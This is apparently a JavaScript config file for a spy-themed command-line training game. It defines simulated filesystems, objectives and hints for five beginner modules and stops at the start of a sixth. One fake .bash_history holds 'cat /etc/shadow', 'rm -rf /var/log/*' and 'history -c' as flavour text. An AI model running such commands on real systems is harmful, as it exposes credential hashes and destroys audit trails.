/**
 * CLHConfig.js - Command Line Hacker Module Configuration Registry
 * Hexworth Prime - House of Script
 *
 * Central registry for all CLH course modules.
 * Each module defines its filesystem overlay, objectives, and metadata.
 *
 * Usage:
 *   const config = CLHConfig.getModule('CLH-002');
 *
 * Version: 1.0.0
 * Created: January 17, 2026
 */

const CLHConfig = (function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // TIER DEFINITIONS
    // ═══════════════════════════════════════════════════════════════

    const TIERS = {
        'CLI Recruit': {
            modules: ['CLH-001', 'CLH-002', 'CLH-003'],
            badge: 'cli-recruit',
            description: 'Basic command line navigation'
        },
        'CLI Analyst': {
            modules: ['CLH-004', 'CLH-005', 'CLH-006'],
            badge: 'cli-analyst',
            description: 'Process and log analysis'
        },
        'CLI Operative': {
            modules: ['CLH-007', 'CLH-008', 'CLH-009'],
            badge: 'cli-operative',
            description: 'Permissions and scripting'
        },
        'CLI Shadow': {
            modules: ['CLH-010', 'CLH-011', 'CLH-012'],
            badge: 'cli-shadow',
            description: 'Network operations'
        },
        'CLI Phantom': {
            modules: ['CLH-013', 'CLH-014', 'CLH-015'],
            badge: 'cli-phantom',
            description: 'Advanced operations'
        },
        'CLI Specter': {
            modules: ['CLH-016', 'CLH-017', 'CLH-018', 'CLH-019', 'CLH-020', 'CLH-021', 'CLH-022'],
            badge: 'cli-specter',
            description: 'System reconnaissance and infiltration'
        },
        'CLI Wraith': {
            modules: ['CLH-023', 'CLH-024', 'CLH-025', 'CLH-026', 'CLH-027'],
            badge: 'cli-wraith',
            description: 'Persistence and privilege escalation'
        },
        'CLI Ghost': {
            modules: ['CLH-028', 'CLH-029', 'CLH-030'],
            badge: 'cli-ghost',
            description: 'Elite field operations'
        }
    };

    // ═══════════════════════════════════════════════════════════════
    // MODULE REGISTRY
    // ═══════════════════════════════════════════════════════════════

    const MODULES = {

        // ──────────────────────────────────────────────────────────
        // CLH-001: Introduction to the Command Line Interface
        // Theme: First contact with the hacker terminal
        // ──────────────────────────────────────────────────────────
        'CLH-001': {
            title: 'Introduction to Hacker CLI',
            description: 'Welcome to Command Line Hacker training. Learn basic reconnaissance commands.',
            prerequisites: [],  // No prerequisites - entry point
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,  // All commands allowed

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: []
                },
                '/home/operator/missions': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', 'handler_notes.txt']
                },
                '/home/operator/missions/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `OPERATION: SILENT ECHO
Classification: TOP SECRET // NOFORN

Welcome to Command Line Hacker training, operative.

Your mission: Master the terminal interface. The command line
is your primary weapon in the field. GUI tools leave traces.
The terminal leaves only what you choose.

Complete all training modules to be assigned to active operations.

Handler: GHOSTWRITER
Comms Window: 0300-0500 UTC

"In the shadows, we type. In silence, we execute."
`
                },
                '/home/operator/missions/targets.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `[CLASSIFIED - LEVEL 4 CLEARANCE REQUIRED]

Target List - PENDING AUTHORIZATION

Complete CLI training modules 001-005 to unlock.

Current clearance: TRAINEE
Required clearance: ANALYST
`
                },
                '/home/operator/missions/handler_notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 289,
                    content: `HANDLER NOTES - For Trainee Eyes Only

Basic commands every operative must know:
- whoami: Verify your identity
- pwd: Know your position
- hostname: Identify the system
- ls: Survey your environment
- cd: Move through the filesystem
- cat: Read file contents

Start with reconnaissance. Always.
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'exfil.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `#!/bin/bash
# RECON.SH - Basic reconnaissance script
# Author: GHOSTWRITER
# Classification: UNCLASSIFIED

echo "[*] Initiating recon..."
whoami
hostname
pwd
ls -la
echo "[*] Recon complete."
`
                },
                '/home/operator/scripts/exfil.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 87,
                    content: `#!/bin/bash
# EXFIL.SH - Data exfiltration template
# [REDACTED - Complete training to unlock]
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['nmap_results.txt']
                },
                '/home/operator/tools/nmap_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Nmap scan results - Training Lab
# Target: 10.0.0.0/24

Host: 10.0.0.1 (gateway)
  22/tcp   open  ssh
  80/tcp   open  http

Host: 10.0.0.42 (shadow)
  22/tcp   open  ssh
  3306/tcp open  mysql

[Scan truncated for training]
`
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w\\$ "
alias ll='ls -la'
alias cls='clear'

# "The best hackers leave no trace."
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `ssh handler@deadrop.onion
cat /etc/shadow
rm -rf /var/log/*
history -c
`
                },
                '/home/operator/.classified': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 201,
                    content: `ASSET CODENAMES - MEMORIZE AND DELETE

MOCKINGBIRD - Media contact (compromised)
RAVEN - Field operative, Berlin
PHOENIX - Extraction specialist
GHOST - You

Handler dead drop: 40.7128° N, 74.0060° W
Phrase: "The weather is nice in Prague"
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Identify Operator',
                    hint: 'Identify your current user account: whoami',
                    check: (cmd, state) => cmd.trim() === 'whoami'
                },
                {
                    id: 2,
                    task: 'RECON: Locate Position',
                    hint: 'Determine your filesystem position: pwd',
                    check: (cmd, state) => cmd.trim() === 'pwd'
                },
                {
                    id: 3,
                    task: 'RECON: Identify Target System',
                    hint: 'Identify the hostname: hostname',
                    check: (cmd, state) => cmd.trim() === 'hostname'
                },
                {
                    id: 4,
                    task: 'SURVEY: Assess Environment',
                    hint: 'Survey your surroundings: ls',
                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.startsWith('ls ')
                },
            ],

            remoteHosts: null,  // No SSH targets in intro module
        },

        // ──────────────────────────────────────────────────────────
        // CLH-002: Navigation & Reconnaissance
        // Theme: Field operations reconnaissance mission
        // ──────────────────────────────────────────────────────────
        'CLH-002': {
            title: 'Navigation & Reconnaissance',
            description: 'Navigate the filesystem like a ghost. Map the territory and extract critical intel.',
            prerequisites: ['CLH-001'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                // Home directory structure
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['Documents', 'intel', 'scripts', 'logs', '.bash_history', '.bashrc']
                },
                '/home/operator/Documents': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['notes.txt']
                },
                '/home/operator/Documents/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 40,
                    content: 'Meeting at 14:00 in the secure room.\n'
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'targets.txt', '.secret.txt', '.classified']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `CLASSIFIED BRIEFING - OPERATION SHADOW
========================================

Mission: Establish secure access to target network
Status: ACTIVE

PRIMARY OBJECTIVES:
1. Map filesystem structure
2. Locate intel directories
3. Extract mission-critical data
4. Return to base undetected

Handler: PHOENIX
Clearance: LEVEL 3

Remember: Leave no trace.
`
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TARGET LIST
============
- Alpha Server (192.168.1.10)
- Beta Database (192.168.1.20)
- Gamma Comms (192.168.1.30)

Priority: HIGH
`
                },
                '/home/operator/intel/.secret.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'The password to the vault is: SHADOWRUN\n'
                },
                '/home/operator/intel/.classified': {
                    type: 'dir',
                    perms: 'drwx------',
                    owner: 'operator',
                    group: 'operator',
                    children: ['eyes-only.txt']
                },
                '/home/operator/intel/.classified/eyes-only.txt': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `TOP SECRET - EYES ONLY

Project LOOKING GLASS is compromised.
Trust no one from Division 7.

Coordinates: 47.6062° N, 122.3321° W
`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['backup.sh', 'scan.sh']
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 45,
                    content: '#!/bin/bash\ncp -r ~/intel ~/intel.bak\n'
                },
                '/home/operator/scripts/scan.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 38,
                    content: '#!/bin/bash\nls -la ~/intel\n'
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log']
                },
                '/home/operator/logs/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: '2024-01-15 08:23:11 - User login: operator\n2024-01-15 08:24:03 - Directory accessed: /intel\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 35,
                    content: 'whoami\nls\ncd intel\ncat briefing.txt\n'
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 24,
                    content: '# Operator shell config\n'
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: Map the Territory',
                    hint: 'Use ls to survey your current location',
                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.startsWith('ls ')
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Intel Directory',
                    hint: 'Navigate into the "intel" directory: cd intel',
                    check: (cmd, state) => state.currentDir.includes('intel')
                },
                {
                    id: 3,
                    task: 'SCAN: Deep Reconnaissance',
                    hint: 'Reveal hidden files with: ls -la',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-') &&
                                   (cmd.includes('l') && cmd.includes('a'))
                },
                {
                    id: 4,
                    task: 'EXTRACT: Read the Briefing',
                    hint: 'Access the briefing.txt file: cat briefing.txt',
                    check: (cmd, state) => cmd.trim() === 'cat briefing.txt' ||
                                   cmd.trim() === 'cat ./briefing.txt'
                },
                {
                    id: 5,
                    task: 'EXFIL: Return to Base',
                    hint: 'Navigate back to home: cd ~ (or cd)',
                    check: (cmd, state) => state.currentDir === '/home/operator'
                },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-003: Pattern Hunting
        // Theme: UFO incident report with hidden secret code
        // ──────────────────────────────────────────────────────────
        'CLH-003': {
            title: 'Pattern Hunting',
            description: 'Use grep to find needles in haystacks. A secret code is hidden in the evidence.',
            prerequisites: ['CLH-002'],
            tier: 'CLI Recruit',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,
            secretCode: '42XDFL',  // Secret code to find

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['evidence', 'tools', '.bash_history']
                },
                '/home/operator/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mystery.txt', 'notes.txt', 'README.txt']
                },
                '/home/operator/evidence/mystery.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 2048,
                    content: `CLASSIFIED INCIDENT REPORT - CASE FILE #2847
============================================
Date: November 12, 2025
Location: Rural Nevada, 37.2431N 115.7930W
Reporting Agent: Field Officer Martinez

SUMMARY OF EVENTS:
At approximately 0247 hours, multiple witnesses reported unusual
aerial phenomena near the restricted airspace perimeter. Radar
contact confirmed an unidentified craft traveling at impossible
speeds - estimated 4,700 knots with instantaneous direction changes.

WITNESS TESTIMONY (REDACTED):
"The light just appeared out of nowhere. It wasn't like a plane
or helicopter. It moved in ways that don't make sense. Then it
just stopped, hovering maybe 200 feet above the treeline."

ABDUCTION INCIDENT:
Subject: [REDACTED] - Local rancher, age 47
Duration: Approximately 3 hours 17 minutes of missing time
Subject reports: Paralysis, bright examination room, non-human
entities approximately 4 feet tall with elongated craniums.
Medical examination revealed unexplained scarring and elevated
radiation levels. Subject's GPS tracker data shows impossible
location jump of 127 miles during the missing time window.

PHYSICAL EVIDENCE RECOVERED:
- Soil samples show vitrification consistent with extreme heat
- Unusual metallic fragments (analysis pending)
- Cattle mutilation discovered 0.3 miles from primary site
Secret Code: 42XDFL
SIGNAL INTERCEPT:
NSA listening post captured burst transmission during event.
Frequency: 1420.405 MHz (hydrogen line - significant)
Pattern analysis suggests non-random, possibly encoded message.

CONCLUSION:
This incident is classified TIER-3 UNEXPLAINED. All witnesses
have been debriefed and signed non-disclosure agreements.
Local law enforcement redirected with cover story (military
training exercise). Recommend continued monitoring of subject
for potential recontact scenario.

END REPORT
[EYES ONLY - UNAUTHORIZED ACCESS PROHIBITED]`
                },
                '/home/operator/evidence/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: 'Case #2847\nSuspect communications intercepted.\nEvidence stored in mystery.txt\nAnalyst notes: Look for patterns.\n'
                },
                '/home/operator/evidence/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 163,
                    content: 'EVIDENCE DIRECTORY\n==================\nFiles in this directory are part of ongoing investigation.\nUse grep to search for patterns.\nDo not modify original evidence.\n'
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['search.sh']
                },
                '/home/operator/tools/search.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 54,
                    content: '#!/bin/bash\n# Quick search script\ngrep -rn "$1" ./evidence/\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 34,
                    content: 'ls\ncd evidence\ncat mystery.txt\n'
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Survey the Evidence',
                    hint: 'Examine the evidence directory: ls evidence/',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('evidence')
                },
                {
                    id: 2,
                    task: 'INTEL: Examine the Target File',
                    hint: 'Preview mystery.txt: cat evidence/mystery.txt',
                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('mystery')
                },
                {
                    id: 3,
                    task: 'HUNT: Search for "Secret"',
                    hint: 'Use grep to find lines with "Secret"',
                    check: (cmd, state) => cmd.includes('grep') && (cmd.includes('Secret') || cmd.includes('secret'))
                },
                {
                    id: 4,
                    task: 'EXTRACT: Find the Code Pattern',
                    hint: 'Search for "Secret Code": grep "Secret Code" evidence/mystery.txt',
                    check: (cmd, state, output) => output && output.includes('42XDFL')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm with Line Number',
                    hint: 'Document with line numbers: grep -n "Secret Code" evidence/mystery.txt',
                    check: (cmd, state) => cmd.includes('grep') && cmd.includes('-n') &&
                                   (cmd.includes('Secret') || cmd.includes('Code'))
                },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-004: Process Investigation
        // Theme: Black site monitoring station, threat hunting
        // ──────────────────────────────────────────────────────────
        'CLH-004': {
            title: 'Process Investigation',
            description: 'Monitor running processes. Something is always watching.',
            prerequisites: ['CLH-003'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['analysis', 'tools', '.bash_history']
                },
                '/home/operator/analysis': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'README.txt', 'baseline.txt', '.incident_log']
                },
                '/home/operator/analysis/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `PID     CPU%    MEM%    PROCESS
1       0.0     0.1     systemd
2       0.0     0.0     kthreadd
127     0.1     0.2     sshd
256     0.3     1.2     signal_intercept
312     0.2     0.8     postgres
445     1.2     2.1     facial_recog_daemon
512     0.1     0.3     cron
623     8.2     5.1     unknown_process
789     0.4     1.5     sat_uplink_monitor
834     0.2     0.6     redis-server
901     0.1     0.4     drone_telemetry
945     0.3     0.9     mysql
1024    0.0     0.2     comms_logger
1156    0.1     0.3     perimeter_sensor`
                },
                '/home/operator/analysis/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `BLACK SITE MONITORING STATION - INCIDENT REPORT
================================================
Facility: [REDACTED] - Codename "SHADOW MESA"
Process snapshot captured: 2024-01-15 14:32:07 UTC
Alert triggered by: Anomalous CPU usage spike
Analyst assigned: operator

SITUATION:
Perimeter breach detected 0300 hours. Unknown entity
gained access to monitoring subnet. One unauthorized
process now running on primary analysis server.

PRIORITY: CRITICAL
Find and document the rogue process before it
exfiltrates satellite telemetry data.
`
                },
                '/home/operator/analysis/baseline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `APPROVED PROCESS BASELINE - CLEARANCE LEVEL 4
==============================================
systemd, kthreadd, sshd, signal_intercept, postgres,
facial_recog_daemon, cron, sat_uplink_monitor,
redis-server, drone_telemetry, mysql, comms_logger,
perimeter_sensor

WARNING: Any process NOT in this list is potentially
hostile and should be flagged for immediate review.
`
                },
                '/home/operator/analysis/.incident_log': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `[0247] Perimeter alarm triggered - Sector 7G
[0251] Guards dispatched - found nothing
[0303] Anomalous network traffic detected
[0315] Unknown process spawned - PID 623
[0332] Process snapshot captured for analysis
[0340] You are now investigating...
`
                },
                '/home/operator/tools': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['hunt.sh']
                },
                '/home/operator/tools/hunt.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: '#!/bin/bash\n# Process hunting script\ngrep -v "^PID" "$1" | sort -k2 -rn | head -5\necho "Top 5 CPU consumers listed"\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: 'ls\ncd analysis\ncat processes.txt\n'
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Locate the analysis directory',
                    hint: 'Try: ls',
                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.trim().startsWith('ls ')
                },
                {
                    id: 2,
                    task: 'Enter the analysis directory',
                    hint: 'Try: cd analysis',
                    check: (cmd, state) => state.currentDir.includes('/analysis')
                },
                {
                    id: 3,
                    task: 'Review the process list',
                    hint: 'Try: cat processes.txt',
                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('processes')
                },
                {
                    id: 4,
                    task: 'Find the anomaly with grep',
                    hint: 'Try: grep "unknown" processes.txt',
                    check: (cmd, state, output) => output && output.includes('unknown_process')
                },
                {
                    id: 5,
                    task: 'Confirm the threat by CPU usage',
                    hint: 'Try: grep "8.2" processes.txt',
                    check: (cmd, state, output) => cmd.includes('grep') && output && output.includes('8.2')
                },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-005: Log Analysis
        // Theme: Deep space SETI monitoring, alien signal detection
        // ──────────────────────────────────────────────────────────
        'CLH-005': {
            title: 'Log Analysis',
            description: 'Read the system logs. Every action leaves a trace.',
            prerequisites: ['CLH-004'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', '.bash_history', '.classified_memo']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'README.txt']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 1842,
                    content: `Jan 15 02:13:11 shadow signal_proc: [INIT] Deep Space Monitoring Array online
Jan 15 02:13:11 shadow signal_proc: [INFO] Dish alignment: Cygnus X-1 quadrant
Jan 15 02:13:12 shadow signal_proc: [INFO] Frequency scan: 1420.405 MHz (hydrogen line)
Jan 15 02:13:14 shadow anomaly_det: [INFO] Background noise baseline established
Jan 15 02:13:15 shadow crypto_mod: [INFO] Decryption module standing by
Jan 15 02:47:33 shadow signal_proc: [ALERT] Signal strength spike detected
Jan 15 02:47:34 shadow anomaly_det: [WARN] Non-random pattern identified in carrier wave
Jan 15 02:47:35 shadow signal_proc: [INFO] Locking dish position for sustained capture
Jan 15 02:47:36 shadow anomaly_det: *ERROR* Pattern matches no known terrestrial source
Jan 15 02:47:37 shadow crypto_mod: [INFO] Attempting frequency decomposition
Jan 15 02:47:38 shadow signal_proc: [INFO] Signal duration: 72 seconds continuous
Jan 15 02:47:39 shadow anomaly_det: [WARN] Mathematical structure detected in signal
Jan 15 02:47:40 shadow crypto_mod: [INFO] Prime number sequence identified in header
Jan 15 02:47:41 shadow anomaly_det: *ERROR* Signal origin: extrasolar - no satellite match
Jan 15 02:47:42 shadow signal_proc: [ALERT] Recording to classified buffer
Jan 15 02:47:43 shadow crypto_mod: [INFO] Partial decode: binary image data detected
Jan 15 02:47:44 shadow systemd[1]: Starting Emergency Protocol Service...
Jan 15 02:47:45 shadow notify: [CRIT] Automatic alert sent to FACILITY DIRECTOR
Jan 15 02:47:46 shadow signal_proc: [INFO] Signal terminated - source moved out of range
Jan 15 02:47:47 shadow anomaly_det: [INFO] Event logged as CONTACT-2847`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 02:12:26 shadow sshd[512]: Server listening on 0.0.0.0 port 22
Jan 15 02:12:45 shadow sshd[623]: Accepted publickey for operator from 10.0.0.1
Jan 15 02:12:45 shadow sshd[623]: pam_unix(sshd:session): session opened for user operator
Jan 15 02:48:01 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; COMMAND=/bin/cat /var/classified/signal_buffer.raw
Jan 15 02:48:01 shadow sudo: pam_unix(sudo:session): session opened for user root
`
                },
                '/home/operator/logs/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `SIGNAL MONITORING STATION - LOG ANALYSIS REQUIRED
==================================================
Facility: Listening Post ECHO-7
Date: January 15, 2024
Classification: TOP SECRET//MAJIC

OBJECTIVE: Identify ERROR entries in system.log
These errors triggered automatic protocol escalation.

BACKGROUND: At 0247 hours, the deep space monitoring
array detected an anomalous signal. Your task is to
document the error entries that flagged this event.

NOTE: This facility does not officially exist.
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['TEMPLATE.txt', 'previous_incidents.log', '.analyst_notes']
                },
                '/home/operator/reports/TEMPLATE.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `INCIDENT REPORT TEMPLATE
========================
Classification: [SECRET/TOP SECRET/MAJIC]
Date: [YYYY-MM-DD]
Analyst: [NAME]
Event ID: [CONTACT-XXXX]

SUMMARY:
[Brief description of the incident]

ERROR LOG ANALYSIS:
- Total ERROR entries found: [X]
- First occurrence: [timestamp]
- Last occurrence: [timestamp]

FINDINGS:
[Detailed analysis]

RECOMMENDATION:
[Suggested action]

SIGNATURES:
Analyst: _________________
Supervisor: _________________
`
                },
                '/home/operator/reports/previous_incidents.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `CONTACT-2841 | 2024-01-03 | FALSE POSITIVE | Satellite interference
CONTACT-2842 | 2024-01-05 | FALSE POSITIVE | Solar flare noise
CONTACT-2843 | 2024-01-08 | UNRESOLVED | Pattern detected, lost signal
CONTACT-2844 | 2024-01-10 | FALSE POSITIVE | Military satellite
CONTACT-2845 | 2024-01-12 | FALSE POSITIVE | Amateur radio bounce
CONTACT-2846 | 2024-01-14 | UNRESOLVED | Mathematical structure, 12sec
CONTACT-2847 | 2024-01-15 | PENDING | **YOU ARE HERE** - 72sec signal
`
                },
                '/home/operator/reports/.analyst_notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Personal notes - DO NOT INCLUDE IN OFFICIAL REPORT

The 2847 signal is different. The others were noise or
satellites, but this one... the math doesn't lie.

Prime number headers. Binary image encoding. 72 seconds
of structured data from OUTSIDE the solar system.

If this is real, everything changes.

- J.
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: 'ls\ncd logs\nhead system.log\n'
                },
                '/home/operator/.classified_memo': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `EYES ONLY - DIRECTOR'S MEMO
============================
If you are reading this, CONTACT-2847 is real.

The signal contained what appears to be a binary
encoded image. Preliminary analysis suggests it
depicts a star map with our solar system marked.

Do NOT discuss this with anyone outside the program.
The official cover story is "equipment malfunction."

- Director [REDACTED]
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Locate log files',
                    hint: 'Try: ls',
                    check: (cmd, state) => cmd.trim() === 'ls' || cmd.trim().startsWith('ls ')
                },
                {
                    id: 2,
                    task: 'Enter the logs directory',
                    hint: 'Try: cd logs',
                    check: (cmd, state) => state.currentDir.includes('/logs')
                },
                {
                    id: 3,
                    task: 'Preview the system log',
                    hint: 'Try: head system.log',
                    check: (cmd, state) => cmd.includes('head') && cmd.includes('system')
                },
                {
                    id: 4,
                    task: 'Find all ERROR entries',
                    hint: 'Try: grep "ERROR" system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && (cmd.toLowerCase().includes('error') || cmd.includes('ERROR')) && output && output.includes('ERROR')
                },
                {
                    id: 5,
                    task: 'Count error entries',
                    hint: 'Try: grep -c "ERROR" system.log',
                    check: (cmd, state) => cmd.includes('grep') && cmd.includes('-c') && (cmd.toLowerCase().includes('error') || cmd.includes('ERROR'))
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "According to the anomaly detector, where did the signal originate?",
                acceptedAnswers: [
                    "extrasolar",
                    "extra-solar",
                    "extra solar",
                    "outside the solar system",
                    "outside solar system",
                    "not terrestrial",
                    "non-terrestrial",
                    "beyond the solar system"
                ],
                hint: "Look at the ERROR entries in system.log - what location is mentioned?",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Intelligence not confirmed. Review the ERROR entries in system.log.",
                correctAnswerMessage: "Signal origin confirmed: EXTRASOLAR. Excellent analysis, Operator."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-006: File Operations
        // Theme: Spy operations, dead drops, encrypted channels
        // ──────────────────────────────────────────────────────────
        'CLH-006': {
            title: 'File Operations',
            description: 'Create, copy, move, and manipulate. Control the filesystem.',
